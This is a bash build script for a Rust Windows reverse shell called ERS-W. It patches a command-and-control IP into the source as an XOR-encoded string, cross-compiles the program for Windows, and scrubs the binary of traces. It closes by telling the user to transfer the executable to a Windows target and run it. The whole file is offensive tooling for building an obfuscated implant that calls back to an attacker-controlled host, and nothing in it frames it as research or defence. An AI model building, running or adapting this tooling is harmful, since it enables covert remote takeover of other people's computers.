#!/bin/bash
# Build + scrub ERS-W (Windows Reverse Shell)
# Usage: bash build.sh [C2_IP]
# Requires: rustup target add x86_64-pc-windows-gnu && sudo apt install gcc-mingw-w64-x86-64
set -e

export PATH="$HOME/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/bin:$PATH"

# Auto-detect or use provided IP
if [ -n "$1" ]; then
    LIVE_IP="$1"
else
    LIVE_IP=$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+')
    if [ -z "$LIVE_IP" ]; then
        LIVE_IP=$(hostname -I | awk '{print $1}')
    fi
fi

if [ -z "$LIVE_IP" ]; then
    echo "[!] Could not detect IP. Pass it manually: bash build.sh 192.168.x.x"
    exit 1
fi

IP_LEN=${#LIVE_IP}
echo "[*] Live IP: $LIVE_IP ($IP_LEN chars)"

# Patch C2 host in source — pad with spaces to fill the const array
PADDED_IP=$(printf "%-15s" "$LIVE_IP")
sed -i "s|const ENC_C2_HOST: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_C2_HOST: [u8; 15] = xor_encode(b\"$PADDED_IP\");|" src/main.rs
echo "[+] Patched src/main.rs with IP=$LIVE_IP"

echo "[*] Building ERS-W (Windows)..."
RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
  cargo build --release --target x86_64-pc-windows-gnu

echo "[*] Scrubbing binary..."
python3 scrub.py

BIN="target/x86_64-pc-windows-gnu/release/win_rev_shell_wss.exe"
cp "$BIN" ./ers-w.exe
chmod +x ./ers-w.exe
echo "[+] Binary ready: ./ers-w.exe ($(du -h ./ers-w.exe | cut -f1))"
echo "[+] Transfer to Windows target and run"
